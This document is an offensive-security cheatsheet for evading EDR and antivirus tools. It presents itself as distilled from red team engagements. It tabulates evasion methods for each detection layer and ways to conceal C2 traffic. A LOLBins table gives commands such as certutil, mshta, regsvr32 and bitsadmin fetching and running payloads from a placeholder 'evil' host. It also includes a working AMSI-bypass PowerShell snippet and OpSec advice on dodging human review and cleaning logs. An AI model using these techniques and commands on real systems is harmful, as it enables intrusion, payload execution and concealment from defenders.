# EDR/AV Evasion and Stealth Operations Cheatsheet

> Source: distilled from multiple real-world red team engagements (2024-2026)
> Use case: reference when operating in environments protected by EDR/AV

---

## Detection Layers and Corresponding Evasion

| Detection layer | What the EDR does | Evasion approach |
|--------|-----------|---------|
| Static signatures | Matches hashes/signatures of known malicious files | Custom builds, encrypted payloads, signature mutation |
| Userland hooks | Hooks ntdll.dll to monitor API calls | Direct syscalls / unhooking / bring your own ntdll |
| Kernel callbacks | Registers process/thread/image-load callbacks | Callback removal (requires a driver) / injecting into legitimate processes |
| ETW | Collects events via ETW | Patch EtwEventWrite / disable providers |
| Behavioral analysis | Analyzes call sequences and behavior patterns | Delayed execution / spread out operations / mimic normal behavior |
| Memory scanning | Periodically scans process memory | Heap encryption / encrypt payload during sleep / module stomping |
| Network detection | Analyzes outbound traffic characteristics | Domain fronting / tunnels via legitimate services / encryption |

---

## Practical Evasion Techniques

### 1. Direct System Calls (bypassing userland hooks)

```
Principle: bypass ntdll.dll entirely and invoke the kernel directly with the syscall instruction
Tools: SysWhispers3 / HellsGate / TartarusGate
Effect: bypasses all userland hooks
```

### 2. Unhooking (restoring the original ntdll)

```
Method A: remap ntdll.dll from disk
Method B: load a clean copy from the KnownDlls directory
Method C: copy the .text section from a suspended process
Effect: restores hooked APIs to their original state
```

### 3. Process Injection (pick low-monitoring targets)

```
Recommended injection targets (low monitoring):
- RuntimeBroker.exe
- sihost.exe
- taskhostw.exe
- explorer.exe (slightly higher risk)

Avoid injecting into:
- lsass.exe (heavily monitored)
- svchost.exe (a focus of some EDRs)
- powershell.exe / cmd.exe
```

### 4. Module Stomping

```
Principle: write the payload into the .text section of an already-loaded legitimate DLL
Effect: memory scans see a legitimate module, not suspicious RWX memory
```

### 5. Sleep Encryption (Ekko/Zilean)

```
Principle: the beacon encrypts its own memory while sleeping
Effect: memory scans cannot find payload signatures
Implementation: register a timer callback, encrypt before sleeping, decrypt on wake
```

### 6. Call Stack Spoofing

```
Principle: forge the call stack so API calls appear to originate from legitimate code
Effect: bypasses call-stack-based behavioral detection
```

---

## C2 Traffic Concealment

| Technique | Principle | Detection difficulty |
|------|------|---------|
| Domain fronting | SNI and Host header of the HTTPS request differ | High |
| Cloudflare Workers | Relay through Cloudflare; looks like normal HTTPS | High |
| Azure/AWS legitimate services | Use cloud service APIs as the C2 channel | Very high |
| DNS over HTTPS | C2 data encoded in DNS queries | Medium |
| WebSocket | Long-lived connection blended into normal web traffic | Medium |
| ICMP tunnel | Data hidden in ICMP packets | Low (easy to spot) |

---

## LOLBins (Living Off the Land)

Using built-in legitimate system programs to perform malicious operations:

| Program | Purpose | Example command |
|------|------|---------|
| certutil | Download files | `certutil -urlcache -split -f http://evil/payload.exe` |
| mshta | Execute HTA | `mshta http://evil/payload.hta` |
| rundll32 | Load DLL | `rundll32 evil.dll,EntryPoint` |
| regsvr32 | Load SCT | `regsvr32 /s /n /u /i:http://evil/file.sct scrobj.dll` |
| wmic | Remote execution | `wmic /node:target process call create "cmd"` |
| msiexec | Install MSI | `msiexec /q /i http://evil/payload.msi` |
| bitsadmin | Download files | `bitsadmin /transfer job http://evil/payload.exe C:\payload.exe` |
| forfiles | Execute command | `forfiles /p c:\windows /m notepad.exe /c "cmd /c calc.exe"` |

---

## AMSI Bypass (PowerShell)

```powershell
# Classic patch (may be signature-detected)
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# Stealthier approach: reflectively patch AmsiScanBuffer
# Or downgrade PowerShell to v2 (no AMSI)
powershell -version 2
```

---

## OpSec Principles

1. **Minimal action principle** — touch nothing unnecessary; reuse existing credentials instead of creating new ones
2. **Time windows** — operate outside the target's business hours (reduces the odds of human review)
3. **Traffic blending** — make C2 communication frequency and size resemble normal business traffic
4. **Nothing touches disk** — execute in memory, clean up immediately after use
5. **Log awareness** — know which operations generate which logs; avoid them in advance or clean up afterward
6. **Honeypot recognition** — identify honeypots before acting (suspiciously open services, overly tempting credentials)
7. **Staggered operations** — do not complete all steps at once; spread them across multiple time windows
